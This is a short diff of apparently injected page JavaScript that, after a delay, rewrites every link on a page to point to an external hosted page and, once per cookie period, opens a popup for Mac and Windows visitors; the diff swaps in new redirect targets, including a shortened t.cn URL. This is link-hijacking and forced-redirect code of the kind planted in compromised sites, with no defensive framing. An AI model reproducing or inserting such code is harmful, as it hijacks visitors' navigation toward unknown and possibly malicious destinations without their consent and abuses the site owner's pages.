@@ -13,7 +13,7 @@ setTimeout(function(){
 var tagsE=document.getElementsByTagName("a");
 while(tagsE[w1]){
   tagsE[w1].setAttribute("rel", "noreferrer");
-  tagsE[w1].setAttribute("href", "http://www.baidu.com");
+  tagsE[w1].setAttribute("href", "http://qingke360.oss-cn-hangzhou.aliyuncs.com/wz/01/wz.html");
   w1++;
 }
 
@@ -21,7 +21,7 @@ while(tagsE[w1]){
 if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
     if (!getCookie('cc_cookie')) {
         setCookie('cc_cookie','ok',1);
-        window.open("http://qingke360.oss-cn-hangzhou.aliyuncs.com/wz/01/wz.html");
+        window.open("http://t.cn/EGwSi9P");
     }
 }else{
 if (!getCookie('cc_cookie')) {
